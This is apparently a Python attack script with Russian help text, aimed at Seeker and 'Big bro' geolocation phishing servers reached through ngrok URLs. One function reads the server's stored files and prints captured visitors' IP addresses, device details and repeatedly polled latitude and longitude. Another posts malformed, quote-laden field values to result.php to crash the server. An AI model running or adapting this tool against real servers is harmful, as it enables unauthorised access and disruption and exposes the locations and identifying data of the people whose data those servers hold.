##!/usr/bin/python
#-*- coding: utf-8 -*-
#Developer by Bafomet
import time

import requests
import json
from concurrent.futures import ThreadPoolExecutor

help = """
-h    Help

-p   Парсинг информации Big bro до 8 версии и Seeker -p [url]
     \033[33m -p https://*****.ngrok.io \033[0m

-c   Сломать -c [url]
     \033[33m -c https://*****.ngrok.io \033[0m

-l   Отслеживайте его географические данные -l [time] [url]
     \033[33m -l 10 https://*****.ngrok.io \033[0m
"""


def destroy_ngrok(url):
    data = {
        "Lat": 'qw%27erty000"',
        "Lon": "qwert'y000 %22",
        "Acc": "qwe/#rty;00:0",
        "Alt": "qwerty][]]000",
        "Dir": "qwer':ty000",
        "Spq": 'qwert":y000',
    }
    headers = {
        "Content-Type": "text/html",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
    }
    requests.post(
        url + "/php/result.php",
        data=data,
        headers=headers
    )
    print("Crashed Seeker")


def check(url, iteration):
    greq = requests.get(url + "/php/result.txt")

    try:
        jgres = json.loads(greq.text)
    except json.JSONDecodeError:
        pass
    else:
        print(f"[{iteration}]Lat  : {jgres['info'][0]['lat']}")
        print(f"[{iteration}]Long : {jgres['info'][0]['lon']}")


def trace_geo(se, url):
    with ThreadPoolExecutor(10) as threadpool:
        for i in range(int(se)):
            threadpool.submit(check, url, i)
            time.sleep(0.5)


def parse_info(url):
    res = requests.get(url + "/php/info.txt")
    try:
        jres = json.loads(res.text)
    except json.JSONDecodeError:
        print(res.text)
    else:
        res_info = jres['dev'][0]
        print(f" OS       : {res_info['os']}")
        print(f" Platform : {res_info['platform']}")
        print(f" Browser  : {res_info['browser']}")
        print(f" Cores    : {res_info['cores']}")
        print(f" Ram      : {res_info['ram']}")
        print(f" IP       : {res_info['ip']}")
        print(f" Vendor   : {res_info['vendor']}")
        print(f" Render   : {res_info['render']}")
